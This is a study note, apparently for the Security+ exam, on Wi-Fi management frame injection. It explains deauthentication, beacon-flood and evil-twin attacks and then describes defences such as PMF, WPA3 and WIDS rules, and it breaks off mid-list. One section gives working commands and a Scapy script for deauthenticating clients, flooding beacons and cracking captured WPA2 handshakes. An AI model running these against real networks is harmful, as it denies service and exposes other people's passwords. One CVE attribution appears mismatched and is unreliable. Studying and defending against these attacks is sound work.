---
domain: "wireless"
tags: [wireless, 802.11, deauthentication, wifi-attacks, mfp, evil-twin]
---
# Management Frame Injection

**Management frame injection** is a class of [[Wi-Fi]] attacks in which an adversary forges or replays **802.11 management frames** — unencrypted control messages such as **beacons**, **probe responses**, **authentication**, and **deauthentication** frames — to manipulate the behavior of access points and client stations. Because the original [[IEEE 802.11]] standard left these frames entirely unprotected, injection underpins many classic wireless attacks, including [[Deauthentication Attack|deauth floods]], [[Evil Twin Attack|evil twins]], [[KARMA Attack|KARMA]], and [[WPA Handshake Capture|WPA handshake capture]]. The mitigation, **802.11w Protected Management Frames (PMF)**, is mandatory under [[WPA3]] but still optional on much of the deployed WPA2 base.

---

## Overview

The 802.11 MAC layer defines three top-level frame categories: **data**, **control**, and **management**. Management frames implement the "plumbing" of a wireless network — how stations discover BSSIDs, join, roam, leave, and coordinate power save. When 802.11 was standardized in 1997, the engineering focus was on reliable radio communication, not adversarial models; management frames were transmitted in the clear with no authentication, and any device within radio range could forge them. Even after [[WEP]], [[WPA]], and [[WPA2]] encrypted the *data* frames, management frames remained plaintext and spoofable for more than a decade.

This design gap makes injection trivially cheap. A commodity USB Wi-Fi adapter placed in **monitor mode** can transmit a frame claiming to originate from any MAC address on any channel. Because the receiving station has no cryptographic way to distinguish a legitimate deauthentication from a forged one, the victim simply obeys: it disconnects, re-associates, reveals a probe list, or latches onto a malicious AP. The attacker does not need to be associated with the network and does not need any credentials — proximity and a radio are sufficient.

Management frame injection is both an **attack primitive** and a **building block**. Standalone, a deauth flood is a denial-of-service tool — famously used in real incidents such as the 2014 Marriott FCC case where the chain was fined $600,000 for deauthing guest hotspots to force guests onto paid hotel Wi-Fi. Chained into larger operations, it enables [[WPA2-PSK]] handshake capture (deauth a client, sniff its EAPOL four-way reconnect, crack offline with [[hashcat]]), evil-twin phishing (beacon and probe-response spoofing to lure a client onto a captive portal), and rogue-AP discovery mapping via probe-request harvesting.

The 2009 ratification of **IEEE 802.11w** (now rolled into 802.11-2012 and later) introduced **Protected Management Frames (PMF)**, also called Management Frame Protection (MFP). PMF cryptographically authenticates a subset of management frames — notably deauthentication, disassociation, and certain action frames — using keys derived from the 4-way handshake. [[WPA3]] and Wi-Fi 6 certification require PMF; WPA2 supports it optionally via the `ieee80211w` parameter in `hostapd` and `wpa_supplicant`. Beacons and probe responses remain unprotected even under PMF, so evil-twin and beacon-flood attacks persist regardless of authentication scheme.

---

## How It Works

An 802.11 management frame has a fixed header followed by subtype-specific fields. The first two bytes of the **Frame Control** field identify the frame type and subtype:

```
Frame Control (2 bytes)
┌──────────┬──────────┬────────┬────────┬────────┬───┬────┬────┬────┬─────┬───┐
│ Protocol │   Type   │ Subtyp │  ToDS  │ FromDS │ MF│ Rt │ Pw │ MD │Prot │Ord│
│  (2b)    │  (2b)    │  (4b)  │  (1b)  │  (1b)  │(1)│(1) │(1) │(1) │ (1) │(1)│
└──────────┴──────────┴────────┴────────┴────────┴───┴────┴────┴────┴─────┴───┘
Type=00 → Management. Relevant subtypes:
  0x0  Association Request      0x8  Beacon
  0x1  Association Response     0xA  Disassociation
  0x4  Probe Request            0xB  Authentication
  0x5  Probe Response           0xC  Deauthentication
                                0xD  Action
```

A deauthentication frame (subtype `0xC`) consists of the MAC header (DA, SA, BSSID), a 2-byte **Reason Code**, and the FCS. Injecting one requires only the target client MAC, the AP's BSSID, and a Wi-Fi radio in monitor/injection mode.

**Step-by-step deauth injection:**

**1. Enable monitor mode and injection on a capable chipset** (Atheros AR9271, Ralink RT3070/RT5572, Realtek 8812AU with patched drivers):

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0          # creates wlan0mon
sudo iw dev wlan0mon set channel 6
```

**2. Discover targets** by passively capturing beacons and probe requests:

```bash
sudo airodump-ng wlan0mon
# Lock onto a specific AP + client
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
```

**3. Craft and transmit** the spoofed frame. `aireplay-ng` builds the packet for you:

```bash
# 10 deauth frames directed at client 11:22:33:44:55:66 from AP AA:BB:CC:DD:EE:FF
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF \
                             -c 11:22:33:44:55:66 wlan0mon
```

Reason code 7 ("Class 3 frame received from nonassociated STA") is the default and triggers an immediate disconnect on virtually all client implementations.

**4. Scapy equivalent** for custom scripting and research:

```python
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

bssid  = "AA:BB:CC:DD:EE:FF"
client = "11:22:33:44:55:66"

pkt = (RadioTap() /
       Dot11(addr1=client, addr2=bssid, addr3=bssid) /
       Dot11Deauth(reason=7))

sendp(pkt, iface="wlan0mon", count=64, inter=0.1)
```

**5. Beacon flood / evil twin** injection uses subtype `0x8`:

```bash
sudo mdk4 wlan0mon b -n "FreeWiFi" -s 200   # 200 pps beacon flood
sudo hostapd evil.conf                       # serve the cloned SSID
```

When the victim client receives the forged deauth, the 802.11 **state machine** transitions from **State 3 (Authenticated + Associated)** back to **State 1 (Unauthenticated + Unassociated)**. The client then re-sends a Probe Request, Authentication, and Association sequence. If WPA/WPA2 is in use, the **EAPOL four-way handshake** is re-exchanged in plaintext on the air. A sniffer on the same channel captures the MIC-bearing frames, which feed offline password cracking via hashcat mode `22000`:

```bash
hcxpcapngtool -o lab.22000 cap-01.cap
hashcat -m 22000 lab.22000 /usr/share/wordlists/rockyou.txt
```

Without PMF, neither the AP nor the client can detect that the deauth was forged; the Reason Code field is advisory only and carries no MAC-layer cryptographic integrity check.

---

## Key Concepts

- **802.11 Management Frame**: A Type-0 frame that handles discovery, authentication, association, and session termination. Subtypes include Beacon (0x8), Probe Request/Response (0x4/0x5), Authentication (0xB), Association Request/Response (0x0/0x1), Disassociation (0xA), Deauthentication (0xC), and Action (0xD). These are unauthenticated by default.
- **Monitor Mode + Frame Injection**: Two distinct driver capabilities required for these attacks. Monitor mode passes all captured frames up to userspace regardless of BSSID; injection mode allows the NIC to transmit arbitrary frames with attacker-controlled source MAC addresses. Not all chipsets or drivers support both simultaneously.
- **Reason Code / Status Code**: 16-bit integers carried in deauthentication and disassociation frames informing the recipient why it is being disconnected. Reason 7 ("Class 3 frame from nonassociated STA") is the canonical value used in spoofed floods. Clients obey these codes unconditionally in the absence of PMF.
- **Protected Management Frames (PMF / 802.11w)**: An amendment providing cryptographic integrity for unicast management frames via the **IGTK** (Integrity Group Temporal Key) and **BIP** (Broadcast Integrity Protocol — CMAC-128). Protects deauth, disassoc, and robust action frames but explicitly does *not* protect beacons or probe responses.
- **SA Query Procedure**: A 802.11w mechanism where an AP that receives an unsolicited association request from a client it believes is already associated issues an SA Query challenge. Only if the legitimate client fails to respond within a timeout does the AP accept the new association — preventing spoofed reassociation DoS.
- **KARMA Attack**: A superset attack in which the adversary promiscuously responds to any **Probe Request** with a matching Probe Response, tricking clients with stored preferred network lists (PNLs) into auto-associating with the rogue AP. Enabled by unprotected probe responses and aggressive client roaming behavior.
- **Evil Twin**: An adversary-controlled AP that transmits beacons forging the SSID (and optionally the BSSID) of a legitimate network. Clients auto-associate if signal strength is higher than the real AP. Management frame injection is the enabling primitive; even 802.11w cannot prevent beacon spoofing.

---

## Exam Relevance

For **SY0-701**, management frame injection maps to **Domain 2.4** (indicators of malicious activity — wireless attacks) and **Domain 4.1** (applying secure wireless protocols and configurations). Common question patterns:

- **"A user is repeatedly disconnected from the corporate Wi-Fi. Which attack is most likely?"** → **Deauthentication attack** (synonyms the exam may use: *disassociation attack*, *wireless DoS*, *deauth flood*).
- **"Which wireless security feature prevents forged deauthentication frames?"** → **802.11w / Management Frame Protection (MFP) / PMF**. WPA3 is also a correct answer because WPA3 mandates PMF.
- **"Which attack sequence captures a WPA2 handshake for offline cracking?"** → Deauth the client to force reconnection → capture EAPOL four-way handshake → offline brute force. The exam may phrase this as *"disassociation attack followed by dictionary attack."*
- **Evil twin vs. rogue AP gotcha**: A **rogue AP** is *any* unauthorized AP on the network (including one an employee plugged in). An **evil twin** specifically *impersonates* a legitimate SSID. Management frame injection is what makes evil twins effective — knowing the distinction matters for scenario-based questions.
- **Critical gotcha**: Even with WPA3/PMF enabled, **beacons and probe responses remain unauthenticated**. WPA3 does not stop evil twins by itself. Full protection requires additional controls such as 802.1X with server-cert validation or WIPS detection.

---

## Security Implications

Management frame injection is low-skill, low-cost, and extremely difficult to attribute. A $15–$40 USB adapter and Kali Linux are sufficient; source attribution at the radio layer is nearly impossible because MAC addresses are trivially spoofable and no return address is embedded.

**Notable incidents and CVEs:**

- **FCC v. Marriott International (2014)** — Marriott was fined $600,000 for deploying Cisco WIPS to programmatically deauthenticate guest-operated personal hotspots, forcing guests onto paid hotel Wi-Fi. The FCC ruled this a willful violation of 47 U.S.C. § 333.
- **CVE-2019-16275** (hostapd) — Missing source-address validation in association handling allowed spoofed association frames to displace legitimate clients even when PMF was enabled on the AP.
- **CVE-2020-26139** (FragAttacks, Mathy Vanhoef, 2021) — Affected APs forwarded EAPOL frames transmitted by unauthenticated senders, enabling injection-assisted attacks against WPA2 and WPA3 networks by bypassing the expected authentication state machine.
- **CVE-2022-47522 / "SSID Confusion" attack** (Vanhoef, 2023) — Exploited the fact that SSID fields in beacons are not bound to the 4-way handshake, allowing an adversary to trick a client into connecting to a different network than it authenticated to.
- **Commoditized tooling** — Pwnagotchi, Wi-Fi Pineapple (Hak5), and Flipper Zero with the Marauder firmware all automate injection-based handshake capture and evil-twin deployment, lowering the attack skill floor to near zero.

**Impact triad:**

1. **Availability** — Any WPA2 network without PMF can be indefinitely denied to targeted clients with a single terminal and one command.
2. **Confidentiality** — Deauth-driven EAPOL capture feeds offline PSK cracking; short or dictionary-based PSKs fall in minutes on a GPU.
3. **Integrity / Social engineering** — Evil twins serve phishing portals, strip TLS via fake captive portals, or mount full [[Man-in-the-Middle Attack|MITM]] attacks after luring client association.

---

## Defensive Measures

**Require PMF on all SSIDs.** In `hostapd.conf`:

```ini
wpa=2
wpa_key_mgmt=WPA-PSK-SHA256
ieee80211w=2          # 0=disabled, 1=optional (mixed), 2=required
sae_require_mfp=1     # for WPA3-SAE networks
```

Set `ieee80211w=2` (required) on greenfield deployments; use `1` (optional/mixed mode) only when legacy clients without PMF support must be accommodated.

**Deploy WPA3-SAE or WPA3-Enterprise** wherever possible. PMF is mandatory, and SAE's Dragonfly handshake resists offline dictionary attacks even if session traffic is captured — removing the incentive for deauth-to-crack workflows.

**Use 802.1X / EAP-TLS with certificate pinning.** An evil twin cannot present a valid enterprise certificate; a properly configured supplicant will refuse to complete authentication, preventing credential theft even if a client associates with the rogue.

**Deploy a WIDS/WIPS.** Enterprise options include Cisco Catalyst Center (CleanAir), Aruba RFProtect, and Ruckus SmartZone. Open-source alternatives include [[Kismet]] with custom alerts and Zeek wireless scripts. Alert triggers:

- Deauth/disassoc frame rate > 5/second from a single BSSID
- Beacons advertising a known SSID from an unknown BSSID or unexpected OUI
- Probe responses for SSIDs